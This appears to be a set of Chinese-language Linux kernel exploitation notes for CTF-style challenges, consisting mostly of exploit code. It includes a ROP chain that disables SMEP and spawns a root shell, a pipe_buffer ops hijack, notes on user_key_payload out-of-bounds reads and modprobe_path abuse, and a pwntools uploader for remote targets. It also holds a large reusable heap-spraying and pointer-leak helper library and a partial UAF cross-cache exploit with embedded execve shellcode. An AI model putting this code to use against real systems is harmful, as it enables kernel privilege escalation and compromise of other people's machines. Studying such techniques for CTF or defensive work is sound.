    size_t rop_chain[30] = {0};
    int index = 0;
    rop_chain[index++] = 0xffffffff8101c216;        // pop rax; ret;
    rop_chain[index++] = 0x6f0;
    rop_chain[index++] = 0xffffffff8100f034;        // mov cr4,rax; pop rbp; ret 
    rop_chain[index++] = 0x0;
    rop_chain[index++] = (size_t)get_root;
    rop_chain[index++] = 0xffffffff81885588;        // swapgs; ret 
    rop_chain[index++] = 0xffffffff81884177;        // iretq; 
    rop_chain[index++] = (size_t)get_shell;
    rop_chain[index++] = user_cs;
    rop_chain[index++] = user_rflags;
    rop_chain[index++] = user_sp;
    rop_chain[index++] = user_ss;


    fake_pipe_buffer[0] = 0x01010101;
    fake_pipe_buffer[1] = 0x02020202;
    fake_pipe_buffer[2] = fake_pipe_ops;
    fake_pipe_buffer[3] = 0x03030303;

    fake_pipe_ops[0] = pop_rsp_ret;          // pop rsp; ret
    fake_pipe_ops[1] = rop_chain;          // rop_chain
    fake_pipe_ops[2] = mov_rsp_rax_ret;          // control rip - xchg rsp,rax; ret
    fake_pipe_ops[3] = 0x33333333;
    fake_pipe_ops[4] = 0x44444444;




    int fd1 = open("/dev/babydev",2);
    int fd2 = open("/dev/babydev",2);

    ioctl(fd1,0x10001,0x400);
    close(fd1);
    int pipe_fd[2];
    pipe(pipe_fd);
    write(fd2,fake_pipe_buffer,0x20);
    close(pipe_fd[0]);
    close(pipe_fd[1]);
    close(fd2);
    return 0;
}
```



#### shm_file_data

#### msg_msg



#### user_key_payload

```c
#include <sys/types.h>
#include <keyutils.h>

key_serial_t add_key(const char *type, const char *description,const void *payload, size_t plen,key_serial_t keyring);
```

type 用于指定密钥的类型。这个参数决定了密钥的用途和行为。常见的类型包括 "user" 和 "keyring"
description是密钥的描述。这是一个字符串，用于唯一标识密钥。系统会根据这个描述来区分不同的密钥。
payload 是指向包含密钥数据的缓冲区的指针。这个缓冲区包含了密钥的实际内容。
plen 是缓冲区的大小，以字节为单位
keyring 是密钥环的序列号，指定该密钥应该被添加到哪个密钥环中。
密钥环本身也是一种特殊的密钥，可以包含其他密钥。

执行流程：
首先会检测参数是否正确
分配对象obj1，用来存储密钥数据。包含密钥的type、description、有效期、访问权限以及payload指针
将payload拷贝到obj2(plen)中
然后将对应的内容再次拷贝到obj3和obj4(plen+0x18)中
释放obj1和obj2
操作完成后，系统返回新创建的密钥的唯一标识符（密钥 ID）。这个 ID 可用于后续操作，如查询、修改或删除密钥。

拷贝obj1和obj2：
description的拷贝是使用 strndup_user 函数从用户空间复制描述字符串到内核空间，memdup_user()，kmalloc_track_caller和copy_from_user
payload的拷贝是kvmalloc(plen, GFP_KERNEL) 分配 plen 大小的对象后使用 copy_from_user() 进行拷贝
(obj1和obj2是临时对象，在系统调用结束时会被释放)

其中 obj4 为一个 user_key_payload 结构体，有着一个固定大小的头部，其余空间用来存储来自用户空间的数据（密钥内容）
```c
struct user_key_payload {
    struct rcu_head rcu;        /* RCU destructor */
    unsigned short  datalen;    /* length of this data */
    char        data[] __aligned(__alignof__(u64)); /* actual data */
};

//...

struct callback_head {
    struct callback_head *next;
    void (*func)(struct callback_head *head);
} __attribute__((aligned(sizeof(void *))));
#define rcu_head callback_head
```

keyctl() 系统调用为我们提供了读取、更新（分配新对象，释放旧对象）、销毁密钥（释放 payload）的功能，其中读取的最大长度由 user_key_payload->datalen 决定
可以利用题目提供的 UAF 将user_key_payload->datalen 改大，从而完成越界读。



#### modprobe_path

```shell
# 普通权限即可修改该值,并且该程序具有root权限
cat /proc/sys/kernel/modprobe
-> /sbin/modprobe
```

当内核运行一个错误格式的文件（或未知文件类型的文件）的时候，就会调用这个程序
```
（1）do_execve()
（2）do_execveat_common()
（3）bprm_execve()
（4）exec_binprm()
（5）search_binary_handler()
（6）request_module()
（7）call_usermodehelper() -> /sbin/modprobe
```

2017年从linux4.11开始就提出了CONFIG_STATIC_USERMODEHELPER来防止modprobe_path被改
所以要保证CONFIG_STATIC_USERMODEHELPER未启用

```shell
# 其实没法直接判断是否开启
grep CONFIG_STATIC_USERMODEHELPER /boot/config-$(uname -r)
```
















### 杂谈

```shell
# attack.sh
#!/bin/sh
gcc exp.c -static -masm=intel -g -o exp
cp exp core/exp
cd core
hen core.cpio
cd ..
./start.sh
```







```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import os

context.arch = "amd64"
context.log_level = 'debug'
cmd = '$ '


def exploit(r):
    r.sendlineafter(cmd, 'stty -echo')
    os.system('gzip -c ./exp > ./exp.gz')
    r.sendlineafter(cmd, 'cat <<EOF > /tmp/exp.gz.b64')
    r.sendline((read('./exp.gz')).encode('base64'))
    r.sendline('EOF')
    r.sendlineafter(cmd, 'base64 -d /tmp/exp.gz.b64 > /tmp/exp.gz')
    r.sendlineafter(cmd, 'gunzip /tmp/exp.gz')
    r.sendlineafter(cmd, 'chmod +x /tmp/exp')
    r.sendlineafter(cmd, "/tmp/exp")
    r.interactive()

if (len(sys.argv) != 3):
    print("python exp.py ip port")
    exit(0)

p = remote(sys.argv[1],sys.argv[2])
exploit(p)
```



exp

板子

```c
# banzi.h
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <keyutils.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <pthread.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/xattr.h>
#include <unistd.h>
#include <linux/genetlink.h>
#include <linux/if_packet.h>
#include <linux/netlink.h>
#include <linux/openvswitch.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <sched.h>
#include <stdint.h>
#include <sys/utsname.h>
// #define DEBUG 1
#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_DEFAULT "\033[0m"
#define ELEM_CNT(x) (sizeof(x) / sizeof(x[0]))
#define SYS_SETRESUID_OFFSET (0xd81d0)
#define PREFIX_BUF_LEN (16)
#define logd(fmt, ...) dprintf(2, "[*] %s:%d " fmt "\n", __FILE__, __LINE__, ##__VA_ARGS__)
#define logi(fmt, ...) dprintf(2, COLOR_GREEN "[+] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define logw(fmt, ...) dprintf(2, COLOR_YELLOW "[!] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define loge(fmt, ...) dprintf(2, COLOR_RED "[-] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define die(fmt, ...)                      \
    do {                                   \
        loge(fmt, ##__VA_ARGS__);          \
        loge("Exit at line %d", __LINE__); \
        write(sync_pipe[1], "F", 1);       \
        exit(1);                           \
    } while (0)

int sync_pipe[2];
#ifdef DEBUG
#define debug(...) printf(__VA_ARGS__)
#else
#define debug(...) do {} while (0)
#endif

#define HEAP_MASK 0xffff000000000000
#define KERNEL_MASK 0xffffffff00000000

#define PAGE_SIZE 4096
#define MAX_KEYS 199
#define N_STACK_PPS 30
#define POLLFD_PER_PAGE 510
#define POLL_LIST_SIZE 16
#define NFDS(size) (((size - POLL_LIST_SIZE) / sizeof(struct pollfd)) + N_STACK_PPS);
pthread_t poll_tid[0x1000];
size_t poll_threads;
pthread_mutex_t mutex;
uint64_t usr_cs, usr_ss, usr_rflags;
uint64_t proc_single_show;
uint64_t target_object;
uint64_t kernel_base;

int pipes[0x1000][2];
int seq_ops[0x10000];
int ptmx[0x1000];
int fds[0x1000];
int keys[0x1000];
int corrupted_key;
int n_keys;
int fd;
int s;


struct t_args
{
    int id;
    int nfds;
    int timer;
    bool suspend;
};


struct rcu_head
{
    void *next;
    void *func;
};


struct user_key_payload
{
    struct rcu_head rcu;
    unsigned short	datalen;
    char *data[];
};
void init_namespace(void);
void set_cpu_affinity(int cpu_n, pid_t pid);
void packet_socket_rx_ring_init(int s, unsigned int block_size,
                                unsigned int frame_size, unsigned int block_nr,
                                unsigned int sizeof_priv, unsigned int timeout);


int packet_socket_setup(unsigned int block_size, unsigned int frame_size,
                        unsigned int block_nr, unsigned int sizeof_priv, int timeout);

int pagealloc_pad(int size, int count);

struct poll_list
{
    struct poll_list *next;
    int len;
    struct pollfd entries[];
};



bool is_kernel_pointer(uint64_t addr);


bool is_heap_pointer(uint64_t addr);


void __pause(char *msg);


void save_state();
int randint(int min, int max);
void assign_to_core(int core_id);
void assign_thread_to_core(int core_id);
void init_fd(int i);
void *alloc_poll_list(void *args);
void create_poll_thread(int id, size_t size, int timer, bool suspend);
void join_poll_threads(void);
int alloc_key(int id, char *buff, size_t size);
void free_key(int i);
void free_all_keys(bool skip_corrupted_key);
char *get_key(int i, size_t size);
void alloc_pipe_buff(int i);
void release_pipe_buff(int i);
void alloc_tty(int i);
void free_tty(int i);
void alloc_seq_ops(int i);
void free_seq_ops(int i);
int leak_kernel_pointer(int kid);
int leak_heap_pointer(int kid);
bool check_root();
// typedef struct
// {
//     int64_t idx;
//     uint64_t size;
//     char *buf;    
// }user_req_t;

// struct tpacket_req {
//     unsigned int    tp_block_size;
//     unsigned int    tp_block_nr;
//     unsigned int    tp_frame_size;
//     unsigned int    tp_frame_nr;
// };

// enum tpacket_versions {
//     TPACKET_V1,
//     TPACKET_V2,
//     TPACKET_V3,
// };
// #define PACKET_VERSION 10
// #define PACKET_TX_RING 13
#define ISO_SLAB_LIMIT 8
#define INITIAL_PAGE_SPRAY 500
typedef struct
{
    bool in_use;
    int idx[ISO_SLAB_LIMIT];
}full_page;

enum spray_cmd {
    ALLOC_PAGE,
    FREE_PAGE,
    EXIT_SPRAY,
};

// typedef struct
// {
//     enum spray_cmd cmd;
//     int32_t idx;
//     int32_t size;
//     int32_t n;
// }ipc_req_t;

int shmid[0x1000];
void *shmaddr[0x1000];

void alloc_shm(int i);
int rootfd[2];
int sprayfd_child[2];
int sprayfd_parent[2];
// int socketfds[INITIAL_PAGE_SPRAY];
// int alloc_pages_via_sock(uint32_t size, uint32_t n);

// void spray_comm_handler();

// void send_spray_cmd(enum spray_cmd cmd, int idx,int n);
// void unshare_setup(uid_t uid, gid_t gid);
void errExit(char *msg);
void registerUserfault(void *fault_page,void *handler);

int spray_sendmsg(char *buf,int size,int count);
void hexdump(unsigned char *buff, size_t size);
struct msg_msg {
  uint64_t m_list_next;
  uint64_t m_list_prev;
  uint64_t m_type;
  uint64_t m_ts;
  uint64_t next;
  uint64_t security;
};

struct msg_msgseg {
  uint64_t next;
};
struct {
  long mtype;
  char mtext[0x4000];
} msgbuf;
int msgqid[0x10000];
int add_msg(int msqid, const void *msgp, size_t msgsz);

int show_msg(int msqid, void *msgp,size_t msgsz,long msgtyp);

int free_msg(int msqid, void *msgp, size_t msgsz, long msgtyp);
int msg_get();
void build_msg_msg(struct msg_msg *msg, uint64_t m_list_next,
                   uint64_t m_list_prev, uint64_t m_type,uint64_t m_ts, uint64_t next);
void build_msg(int num);
```



```c
# banzi.c
#include "banzi.h"

void init_namespace(void) {
    int fd;
    char buff[0x100];

    uid_t uid = getuid();
    gid_t gid = getgid();

    if (unshare(CLONE_NEWUSER | CLONE_NEWNS)) {
        die("unshare(CLONE_NEWUSER | CLONE_NEWNS): %m");
    }

    if (unshare(CLONE_NEWNET)) {
        die("unshare(CLONE_NEWNET): %m");
    }

    fd = open("/proc/self/setgroups", O_WRONLY);
    snprintf(buff, sizeof(buff), "deny");
    write(fd, buff, strlen(buff));
    close(fd);

    fd = open("/proc/self/uid_map", O_WRONLY);
    snprintf(buff, sizeof(buff), "0 %d 1", uid);
    write(fd, buff, strlen(buff));
    close(fd);

    fd = open("/proc/self/gid_map", O_WRONLY);
    snprintf(buff, sizeof(buff), "0 %d 1", gid);
    write(fd, buff, strlen(buff));
    close(fd);
}

void set_cpu_affinity(int cpu_n, pid_t pid) {
    cpu_set_t set;

    CPU_ZERO(&set);
    CPU_SET(cpu_n, &set);

    if (sched_setaffinity(pid, sizeof(set), &set) < 0) {
        die("sched_setaffinity: %m");
    }
}

void packet_socket_rx_ring_init(int s, unsigned int block_size,
                                unsigned int frame_size, unsigned int block_nr,
                                unsigned int sizeof_priv, unsigned int timeout) {
    int v = TPACKET_V3;
    int rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &v, sizeof(v));
    if (rv < 0) {
        die("setsockopt(PACKET_VERSION): %m");
    }

    struct tpacket_req3 req;
    memset(&req, 0, sizeof(req));
    req.tp_block_size = block_size;
    req.tp_frame_size = frame_size;
    req.tp_block_nr = block_nr;
    req.tp_frame_nr = (block_size * block_nr) / frame_size;
    req.tp_retire_blk_tov = timeout;
    req.tp_sizeof_priv = sizeof_priv;
    req.tp_feature_req_word = 0;

    rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
    if (rv < 0) {
        die("setsockopt(PACKET_RX_RING): %m");
    }
}

int packet_socket_setup(unsigned int block_size, unsigned int frame_size,
                        unsigned int block_nr, unsigned int sizeof_priv, int timeout) {
    int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (s < 0) {
        die("socket(AF_PACKET): %m");
    }

    packet_socket_rx_ring_init(s, block_size, frame_size, block_nr,
                               sizeof_priv, timeout);

    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_family = PF_PACKET;
    sa.sll_protocol = htons(ETH_P_ALL);
    sa.sll_ifindex = if_nametoindex("lo");
    sa.sll_hatype = 0;
    sa.sll_pkttype = 0;
    sa.sll_halen = 0;

    int rv = bind(s, (struct sockaddr *)&sa, sizeof(sa));
    if (rv < 0) {
        die("bind(AF_PACKET): %m");
    }

    return s;
}

int pagealloc_pad(int size, int count) {
    return packet_socket_setup(size, 2048, count, 0, 100);
}

pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
int add_msg(int msqid, const void *msgp, size_t msgsz) {
	if (msgsnd(msqid, msgp, msgsz, 0) < 0) {
		perror("[-] msgsnd");
    	return -1;
    }
    return 0;
}
void alloc_shm(int i) {
    shmid[i] = shmget(IPC_PRIVATE, 0x1000, IPC_CREAT | 0600);

    if (shmid[i] < 0) {
        perror("[X] shmget fail");
        exit(1);
    }

    shmaddr[i] = (void *)shmat(shmid[i], NULL, SHM_RDONLY);

    if (shmaddr[i] < 0) {
        perror("[X] shmat");
        exit(1);
    }
}
int show_msg(int msqid, void *msgp,size_t msgsz,long msgtyp) {
    if (msgrcv(msqid, msgp, msgsz, msgtyp, MSG_COPY | IPC_NOWAIT) < 0) {
        perror("[-] msgrcv");
        return -1;
    }
    return 0;
}

int free_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
    if (msgrcv(msqid, msgp, msgsz, msgtyp, 0) < 0) {
        perror("[-] msgrcv");
        return -1;
    }
    return 0;
}
int msg_get(){
    int pid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if(pid < 0){
        perror("msgget");
        return -1;
    }
    return pid;
}
void build_msg_msg(struct msg_msg *msg, uint64_t m_list_next,
                   uint64_t m_list_prev, uint64_t m_type,uint64_t m_ts, uint64_t next) {
  msg->m_list_next = m_list_next;
  msg->m_list_prev = m_list_prev;
  msg->m_type = m_type;
  msg->m_ts = m_ts;
  msg->next = next;
  msg->security = 0;
}
void build_msg(int num){
	for(int i = 0;i < num;i++){
		msgqid[i] = msg_get();
	}
}
int spray_sendmsg(char *buf,int size,int count){
    // char buf[size];
    struct msghdr msgh = {0};
    struct sockaddr_in addr = {0};
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(6666);
 
    // filled with 0x61 'a'
    // memset(buf,'\x00',sizeof(buf));
    // *(uint64_t*)(buf + 8*2) = 0xfff0;
    // *(uint64_t*)(buf + 8*3) = 0xdeadbeef;
    // set user space buf(msg header)
    msgh.msg_control = buf;
    msgh.msg_controllen = size;
    msgh.msg_name = (caddr_t)&addr;
    msgh.msg_namelen = sizeof(addr);
    for(int i = 0;i < count;i++){
      sendmsg(sockfd, &msgh, 0);
    }
}
void registerUserfault(void *fault_page,void *handler)
{
   pthread_t thr;
   struct uffdio_api ua;
   struct uffdio_register ur;
   uint64_t uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
   ua.api = UFFD_API;
   ua.features    = 0;
   if (ioctl(uffd, UFFDIO_API, &ua) == -1)
      errExit("[-] ioctl-UFFDIO_API");
 
   ur.range.start = (unsigned long)fault_page;
   ur.range.len   = PAGE_SIZE;
   ur.mode        = UFFDIO_REGISTER_MODE_MISSING;
   if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1)
      errExit("[-] ioctl-UFFDIO_REGISTER");
   int s = pthread_create(&thr, NULL,handler, (void*)uffd);
   if (s!=0)
      errExit("[-] pthread_create");
}
void errExit(char *msg) {
   puts(msg);
   _exit(-1);
}
// int alloc_pages_via_sock(uint32_t size, uint32_t n)
// {
//     struct tpacket_req req;
//     int32_t socketfd, version;

//     socketfd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);
//     if (socketfd < 0)
//     {
//         perror("bad socket");
//         exit(-1);
//     }

//     version = TPACKET_V1;

//     if (setsockopt(socketfd, SOL_PACKET, PACKET_VERSION, &version, sizeof(version)) < 0)
//     {
//         perror("setsockopt PACKET_VERSION failed");
//         exit(-1);
//     }

//     assert(size % 4096 == 0);

//     memset(&req, 0, sizeof(req));

//     req.tp_block_size = size;
//     req.tp_block_nr = n;
//     req.tp_frame_size = 4096;
//     req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;

//     if (setsockopt(socketfd, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req)) < 0)
//     {
//         perror("setsockopt PACKET_TX_RING failed");
//         exit(-1);
//     }

//     return socketfd;
// }

// void spray_comm_handler()
// {
//     ipc_req_t req;
//     int32_t result;

//     do {
//         read(sprayfd_child[0], &req, sizeof(req));
//         assert(req.idx < INITIAL_PAGE_SPRAY);
//         if (req.cmd == ALLOC_PAGE)
//         {
//             socketfds[req.idx] = alloc_pages_via_sock(4096, req.n);
//             printf("%llx\n",socketfds[0]);
//         }
//         else if (req.cmd == FREE_PAGE)
//         {
//             close(socketfds[req.idx]);
//         }
//         result = req.idx;
//         write(sprayfd_parent[1], &result, sizeof(result));
//     } while(req.cmd != EXIT_SPRAY);

// }

// void send_spray_cmd(enum spray_cmd cmd, int idx,int n)
// {
//     ipc_req_t req;
//     int32_t result;

//     req.cmd = cmd;
//     req.idx = idx;
//     req.n = n;
//     write(sprayfd_child[1], &req, sizeof(req));
//     read(sprayfd_parent[0], &result, sizeof(result));
//     assert(result == idx);
// }
// void unshare_setup(uid_t uid, gid_t gid)
// {
//     int temp;
//     char edit[0x100];
//     unshare(CLONE_NEWNS|CLONE_NEWUSER|CLONE_NEWNET);
//     temp = open("/proc/self/setgroups", O_WRONLY);
//     write(temp, "deny", strlen("deny"));
//     close(temp);
//     temp = open("/proc/self/uid_map", O_WRONLY);
//     snprintf(edit, sizeof(edit), "0 %d 1", uid);
//     write(temp, edit, strlen(edit));
//     close(temp);
//     temp = open("/proc/self/gid_map", O_WRONLY);
//     snprintf(edit, sizeof(edit), "0 %d 1", gid);
//     write(temp, edit, strlen(edit));
//     close(temp);
//     return;
// }
void win(void)
{
    if (check_root())
    {
        puts("[+] We are Ro0ot!");
        char *args[] = { "/bin/bash", "-i", NULL };
        execve(args[0], args, NULL);
    }
}
bool is_kernel_pointer(uint64_t addr)
{
    return ((addr & KERNEL_MASK) == KERNEL_MASK) ? true : false;
}


bool is_heap_pointer(uint64_t addr)
{
    return (((addr & HEAP_MASK) == HEAP_MASK) && !is_kernel_pointer(addr)) ? true : false;
}


void __pause(char *msg)
{
    printf("[-] Paused - %s\n", msg);
    getchar();
}


void save_state()
{
    __asm__ __volatile__(
        "movq %0, cs;"
        "movq %1, ss;"
        "pushfq;"
        "popq %2;"
        : "=r" (usr_cs), "=r" (usr_ss), "=r" (usr_rflags) : : "memory" );
}


int randint(int min, int max)
{
    return min + (rand() % (max - min));
}


void assign_to_core(int core_id)
{
    cpu_set_t mask;

    CPU_ZERO(&mask);
    CPU_SET(core_id, &mask);

    if (sched_setaffinity(getpid(), sizeof(mask), &mask) < 0)
    {
        perror("[X] sched_setaffinity()");
        exit(1);
    }
}

void hexdump(unsigned char *buff, size_t size) {
    int i, j;

    for (i = 0; i < size / 8; i++) {
        if ((i % 2) == 0) {
            if (i != 0) printf("  \n");

            printf("  %04x  ", i * 8);
        }

        printf("0x%016lx", ((uint64_t *)(buff))[i]);
        printf("    ");
    }

    putchar('\n');
}

void assign_thread_to_core(int core_id)
{
    cpu_set_t mask;

    CPU_ZERO(&mask);
    CPU_SET(core_id, &mask);

    if (pthread_setaffinity_np(pthread_self(), sizeof(mask), &mask) < 0)
    {
        perror("[X] assign_thread_to_core_range()");
        exit(1);
    }
}


void init_fd(int i)
{
    fds[i] = open("/etc/passwd", O_RDONLY);

    if (fds[i] < 1)
    {
        perror("[X] init_fd()");
        exit(1);
    }
}


void *alloc_poll_list(void *args)
{
    struct pollfd *pfds;
    int nfds, timer, id;
    bool suspend;

    id    = ((struct t_args *)args)->id;
    nfds  = ((struct t_args *)args)->nfds;
    timer = ((struct t_args *)args)->timer;
    suspend = ((struct t_args *)args)->suspend;

    pfds = calloc(nfds, sizeof(struct pollfd));

    for (int i = 0; i < nfds; i++)
    {
        pfds[i].fd = fds[0];
        pfds[i].events = POLLERR;
    }

    assign_thread_to_core(0);

    pthread_mutex_lock(&mutex);
    poll_threads++;
    pthread_mutex_unlock(&mutex);

    debug("[Thread %d] Start polling...\n", id);
    int ret = poll(pfds, nfds, timer);
    debug("[Thread %d] Polling complete: %d!\n", id, ret);
    
    assign_thread_to_core(randint(1, 3));

    if (suspend)
    {   
        debug("[Thread %d] Suspending thread...\n", id);

        pthread_mutex_lock(&mutex);
        poll_threads--;
        pthread_mutex_unlock(&mutex);

        while (1) { };
    }
        
}


void create_poll_thread(int id, size_t size, int timer, bool suspend)
{
    struct t_args *args;

    args = calloc(1, sizeof(struct t_args));

    if (size > PAGE_SIZE)
        size = size - ((size/PAGE_SIZE) * sizeof(struct poll_list));

    args->id = id;
    args->nfds = NFDS(size);
    args->timer = timer;
    args->suspend = suspend;

    pthread_create(&poll_tid[id], 0, alloc_poll_list, (void *)args);
}


void join_poll_threads(void)
{
    for (int i = 0; i < poll_threads; i++)
    {
        pthread_join(poll_tid[i], NULL);
        // open("/proc/self/stat", O_RDONLY);
    }
        
    poll_threads = 0;
}


int alloc_key(int id, char *buff, size_t size)
{
	char desc[256] = { 0 };
    char *payload;
    int key;

    size -= sizeof(struct user_key_payload);

    sprintf(desc, "payload_%d", id);

    payload = buff ? buff : calloc(1, size);

    if (!buff)
        memset(payload, id, size);    

    key = add_key("user", desc, payload, size, KEY_SPEC_PROCESS_KEYRING);

    if (key < 0)
	{
		perror("[X] add_key()");
		return -1;
	}
    	
    return key;
}


void free_key(int i)
{
    if(!keys[i]) puts("Invalid keys[i]");
	
    if(keyctl_revoke(keys[i]) < 0 || keyctl_unlink(keys[i], KEY_SPEC_PROCESS_KEYRING) < 0){
        printf("keys[%d]\n ",i);
        perror("=> ");
        // printf("%d\n")
        return -1;
    }
	
    // n_keys--;
}
void revoke_key(int i)
{
    if(!keys[i]) puts("Invalid keys[i]");
	if(keyctl(KEYCTL_REVOKE, keys[i], 0, 0, 0) < 0){
        printf("keys[%d] ",i);
        perror("=> ");
        return -1;
    }
	// keyctl_unlink(keys[i], KEY_SPEC_PROCESS_KEYRING);
    // n_keys--;
}


void free_all_keys(bool skip_corrupted_key)
{
    for (int i = 0; i < n_keys; i++)
    {   
        if (skip_corrupted_key && i == corrupted_key)
            continue;

        free_key(i);
    }

    sleep(1); // GC keys
}


char *get_key(int i, size_t size)
{
	char *data;

	data = calloc(1, size);
	keyctl_read(keys[i], data, size);
    // printf("%s\n",data);
	return data;
}


void alloc_pipe_buff(int i)
{
    if (pipe(pipes[i]) < 0)
    {
        perror("[X] alloc_pipe_buff()");
        return;
    }

    // if (write(pipes[i][1], "XXXXX", 5) < 0)
    // {
    //     perror("[X] alloc_pipe_buff()");
    //     return;
    // }
}


void release_pipe_buff(int i)
{
    if (close(pipes[i][0]) < 0)
    {
        perror("[X] release_pipe_buff()");
        return;
    }

    if (close(pipes[i][1]) < 0)
    {
        perror("[X] release_pipe_buff()");
        return;
    }
}


void alloc_tty(int i)
{
    ptmx[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);

    if (ptmx[i] < 0)
    {
        perror("[X] alloc_tty()");
        exit(1);
    }
}


void free_tty(int i)
{
    close(ptmx[i]);
}


void alloc_seq_ops(int i)
{
    seq_ops[i] = open("/proc/self/stat", O_RDONLY);

    if (seq_ops[i] < 0)
    {
        perror("[X] spray_seq_ops()");
        exit(1);
    }
}


void free_seq_ops(int i)
{
    close(seq_ops[i]);
}


int leak_kernel_pointer(int kid)
{
    uint64_t *leak;
    char *key;

    key = get_key(kid, 0xfff0);
    leak = (uint64_t *)key;

    // if (is_kernel_pointer(*leak) && (*leak & 0xfff) == 0x520)
    // {
    //     // corrupted_key = i;
    //     // proc_single_show = *leak;
    //     // kernel_base = proc_single_show - 0xffffffff813275c0;

    //     // printf("[+] Corrupted key found: keys[%d]!\n", corrupted_key);
    //     // printf("[+] Leaked proc_single_show address: 0x%llx\n", proc_single_show);
    //     // printf("[+] Kernel base address: 0x%llx\n", kernel_base + 0xffffffff00000000);
    //     kernel_base = 
        
    //     return 0;
    // }
    for (int i = 0; i < 0xfff0/sizeof(uint64_t); i++)
    {
        // if(is_heap_pointer(leak[i])){
        //     printf("heap_%d ==> 0x%llx\n",i,leak[i]);
        // }
        if (is_kernel_pointer(leak[i]) && (leak[i] & 0xfff) == 0x520)
        {   
            // if (leak[i + 2] == leak[i + 3] && leak[i + 2] != 0)
            // {
            //     target_object = leak[i];
            //     logi("Leaked kmalloc-1024 object: 0x%llx\n", target_object);
            //     return 0;
            // }
            uint64_t kernel_base1 = leak[i] - 0x1ab2520;
            logi("get kernel_base: 0x%llx",kernel_base1);
            return kernel_base1;
        }
    }

    return -1;
}


int leak_heap_pointer(int kid)
{
    uint64_t *leak;
    char *key;

    key = get_key(kid, 0xfff0);
    // hexdump(key,0x100);
    leak = (uint64_t *)key;

    for (int i = 0; i < 0xfff0/sizeof(uint64_t); i++)
    {
        // if(is_heap_pointer(leak[i])){
        //     printf("heap_%d ==> 0x%llx\n",i,leak[i]);
        // }
        if (is_heap_pointer(leak[i]) && (leak[i] & 0xff) == 0x00)
        {   
            if (leak[i + 2] == leak[i + 3] && leak[i + 2] != 0)
            {
                target_object = leak[i];
                logi("Leaked kmalloc-1024 object: 0x%llx", target_object);
                return 0;
            }
        }
    }

    return -1;
}


bool check_root()
{
	int fd;
    
    if ((fd = open("/etc/shadow", O_RDONLY)) < 0)
        return false;
        
    close(fd);
    
    return true;
}
```





exp.c

```c
#include "banzi.h"
int add(int fd,char *buf){
    uint64_t arg[1] = {buf};
    ioctl(fd,0x20,arg);
}
int del(int fd,uint64_t idx){
    uint64_t arg[1] = {idx};
    ioctl(fd,0x30,arg);
}
int main(){
    const char attack_data[] = {106, 104, 72, 184, 47, 98, 105, 110, 47, 47, 47, 115, 80, 72, 137, 231, 104, 114, 105, 1, 1, 129, 52, 36, 1, 1, 1, 1, 49, 246, 86, 106, 8, 94, 72, 1, 230, 86, 72, 137, 230, 49, 210, 106, 59, 88, 15, 5};
    char *buf = calloc(1,0x4000);
    char data[0x1000] = { 0 };
    char key[32] = { 0 };
    uint64_t *rop;
    void *stack;
    char *buff;
    struct msghdr msgh = {0};
    struct sockaddr_in addr = {0};
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    assign_to_core(0);
    save_state();
    fd = open("/dev/kernelpwn",1);
    if(fd < 0){
        puts("Open Error");
        _exit(1);
    }
    puts("[1-1]draining kmalloc-512");
    for(int i = 0;i < 8;i++){
      memset(buf,'a',0x200);
      keys[i] = alloc_key(i,buf,0x110);
    }
    // memset(buf,'b',0x200);
    add(fd,buf);
    del(fd,0);
    puts("[1-2]spray user_key_payload(0x200) and free all keys");
    for(int i = 8;i<73;i++){
      keys[i] = alloc_key(i,buf,0x110);
    }
    for(int i = 0;i<73;i++){
      free_key(i);
    }
    puts("[1-3]spray msg_msg to cross cache attack");
    build_msg(2000);
    memset(msgbuf.mtext,'A',0x200);
    for(int i = 0;i<1000;i++){
      msgbuf.mtype = 1;
      add_msg(msgqid[i],&msgbuf,0x200-0x30);
    }
    for(int i = 0;i<1000;i++){
      msgbuf.mtype = 2;
      add_msg(msgqid[i],&msgbuf,0x400-0x30);
    }
    puts("[1-4]uaf");//此时漏洞对块和msg_msg共用一个堆块
    del(fd,0);
    //通过skb_buffer来占位msg_msg
    puts("[2-1]spray skb_buffer to change msg_msg->m_ts leak heap_addr");
    *(uint64_t*)buf = NULL;
    *(uint64_t*)(buf+8) = NULL;
    *(uint64_t*)(buf+8*2) = 1;
    *(uint64_t*)(buf+8*3) = 0x1000-0x30;
    *(uint64_t*)(buf+8*4) = NULL;
    *(uint64_t*)(buf+8*5) = NULL;
    *(uint64_t*)(buf+8*6) = 0xdeadbeaf;
    *(uint64_t*)(buf+8*7) = 0xdeadbeaf;
    int ss[1000][2];
    for(int i = 0;i < 500;i++){
